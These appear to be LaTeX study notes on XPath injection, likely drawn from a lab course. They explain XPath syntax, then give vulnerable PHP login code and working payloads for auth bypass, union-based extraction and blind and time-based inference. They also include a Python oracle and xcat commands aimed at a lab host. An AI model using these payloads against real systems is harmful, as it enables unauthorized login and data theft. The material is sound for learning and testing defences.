\section{Xpath injection}

\subsection{Introduction}

For more details on the XPath syntax, look at the \href{https://www.w3.org/TR/xpath-3/}{W3C specification}

\subsubsection{Nodes}
Each XPath query selects a set of nodes from the XML document. A query is evaluated from a {\bf context node}, which marks the starting point. Therefore, depending on the context node, the same query may have different results. Here is an overview of the base cases of XPath queries for selecting nodes:

\begin{verbatim}
Query 	        Explanation
name 	        Select all name child nodes of the context node
/ 	            Select the document root node
// 	            Select descendant nodes of the context node
. 	            Select the context node
.. 	            Select the parent node of the context node
@difficulty 	Select the difficulty attribute node of the context node
text() 	        Select all text node child nodes of the context node
\end{verbatim}

Note: If a query starts with \verb+//+, the query is evaluated from the document root and not at the context node.

\begin{verbatim}
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>

\end{verbatim}

\begin{verbatim}
Select all module child nodes of academy_modules node
/academy_modules/module 	

Select all module nodes
//module 	                                

Select all title nodes that are descendants of the academy_modules node
/academy_modules//title 	        

Select the difficulty attribute node of all tier element nodes under the specified path
/academy_modules/module/tier/@difficulty 	

Select all difficulty attribute nodes
//@difficulty 	
\end{verbatim}

\subsubsection{Predicates}
Predicates filter the result from an XPath query similar to the \verb+WHERE+ clause in a SQL query. Predicates are part of the XPath query and are contained within brackets \verb+[]+. Here are some example predicates:

\begin{verbatim}
Select the first module child node of the academy_modules node
/academy_modules/module[1] 	

Equivalent to the above query
/academy_modules/module[position()=1] 	

Select the last module child node of the academy_modules node
/academy_modules/module[last()] 	

Select the first two module child nodes of the academy_modules node
/academy_modules/module[position()<3] 	

Select the title of all modules where the tier element node equals 2
//module[tier=2]/title 	

Select the title of all modules where the author element node has a co-author attribute node
//module/author[@co-author]/../title 	

Select all modules where the tier element node has a difficulty attribute node set to medium
//module/tier[@difficulty="medium"]/.. 	
\end{verbatim}

Predicates support the following operands:
\begin{verbatim}
Operand 	Explanation
+ 	        Addition
- 	        Subtraction
* 	        Multiplication
div 	    Division
= 	        Equal
!= 	        Not Equal
< 	        Less than
<= 	        Less than or Equal
> 	        Greater than
>= 	        Greater than or Equal
or 	        Logical Or
and 	    Logical And
mod 	    Modulus
\end{verbatim}

\subsubsection{Wildcards and  Union}
Sometimes, we do not care about the type of node in a path. In that case, we can use one of the following wildcards:
\begin{verbatim}
Query 	Explanation
node() 	Matches any node
* 	    Matches any element node
@* 	    Matches any attribute node
\end{verbatim}

We can use these wildcards to construct queries like so:
\begin{verbatim}
Query 	                Explanation
//* 	                Select all element nodes in the document
//module/author[@*]/.. 	Select all modules where the author element node has at least one attribute node of any kind
/*/*/title 	            Select all title nodes that are exactly two levels below the document root
\end{verbatim}

Note: The wildcard \verb+*+ matches any node but not any descendants like \verb+//+ does. Therefore, we need to specify the correct amount of wildcards in our query. In our example XML document, the query \verb+/*/*/title+ returns all module titles, but the query \verb+/*/title+ returns nothing.

Lastly, we can combine multiple XPath queries with the union operator \verb+|+ like so:
\begin{verbatim}
Query 	                                                        Explanation
//module[tier=2]/title/text() | //module[tier=3]/title/text() 	Select the title of all modules in tiers 2 and 3
\end{verbatim}

\subsection{Auth bypass}

\subsubsection{Simple}

auth validation code:
\begin{verbatim}
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
\end{verbatim}

payload:
\begin{verbatim}
# anyuser
username=' or '1'='1&password=' or '1'='1

# given user
username=admin' or '1'='1&password=toto
\end{verbatim}

\subsubsection{Realist}

auth validation code:
\begin{verbatim}
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
\end{verbatim}



uyload:
\begin{verbatim}
username=' or true() or '&password=toto
username=' or contains(.,'admin') or '&...
\end{verbatim}


\subsection{Union based}

\subsubsection{Basic}
Consider a request 
\begin{verbatim}
$query = "/a/b/c/[contains(d/text()='" . $_POST['q'] . "'/" . $_POST['f'];
$results = $xml->xpath($query);

#/a/b/c/[contains(d/text(), 'BAR')]/fullstreetname
\end{verbatim}

payload:
\begin{verbatim}
# validation
q=SOMETHINGINVALID') or ('1'='1

# exflitrate
q=SOMETHINGINVALID&f=fullstreetname+|+//text()
q=SOMETHINGINVALID') or ('1'='1&f=../../..//text()
\end{verbatim}

\subsubsection{Advanced}

find schema depth:
\begin{verbatim}
fullstreetname | /*[1] 
fullstreetname | /*[1]/*[1]...SNIP.../*[1]
\end{verbatim}

rexfiltrate data:
\begin{verbatim}
fullstreetname | /*[1]/*[1]/*[1]/*[1]
...SNIP...
fullstreetname | /*[1]/*[1]/*[1]/*[5]
\end{verbatim}

think that depth can be different in case of mixed documents
\begin{verbatim}
<dataset>
	<streets>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</streets>
	<users>
		<group name="users">
			<user>
				<username>test</username>
				<password>test</password>
			</user>
		</group>
		<group name="admins">
			<user>
				<username>admin</username>
				<password>admin</password>
			</user>
		</group>
	</users>
</dataset>
\end{verbatim}



\subsection{Blind}
Consider a form to send a msg to a user:
\begin{verbatim}
username=toto&msg=titi
\end{verbatim}

with oracle:
\begin{verbatim}
def oracle_union_get(url, q):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {'username': q, 'msg': 'test'}
    r = requests.post(url, data=payload, headers=headers)
    return 'successfully' in r.text 
\end{verbatim}

\verb+username+ is injectable:
\begin{verbatim}
assert oracle_union_get(url, "invalid' or '1'='1")
\end{verbatim}


\subsubsection{Usable functions}
\begin{itemize}
    \item \verb+name()+
    \item \verb+substring()+
    \item \verb+string-length()+
    \item \verb+count()+ 
\end{itemize}

\subsubsection{Length of a Node's Name}
\begin{verbatim}
 invalid' or string-length(name(/*[1]))=1 and '1'='1
\end{verbatim}

\subsubsection{Node's Name}
\begin{verbatim}
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
\end{verbatim}

\subsubsection{Number of Child Nodes}
\begin{verbatim}
invalid' or count(/users/*)=1 and '1'='1
\end{verbatim}

\subsubsection{Node value lenght}
\begin{verbatim}
invalid' or string-length(/users/user[1]/username)=1 and '1'='1
\end{verbatim}


\subsubsection{Node value string}
\begin{verbatim}
invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
\end{verbatim}

\subsection{Time based}
\begin{verbatim}
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1

\end{verbatim}


\subsection{tools}

\subsubsection{xcat}

\begin{verbatim}
# try with q param
xcat detect http://94.237.62.37:33228/index.php \
    q q=BAR f=fullstreetname --true-string='!No Result'

# exfiltrate
xcat run http://94.237.62.37:33228/index.php \
    q q=BAR f=fullstreetname --true-string='!No Result'
\end{verbatim}

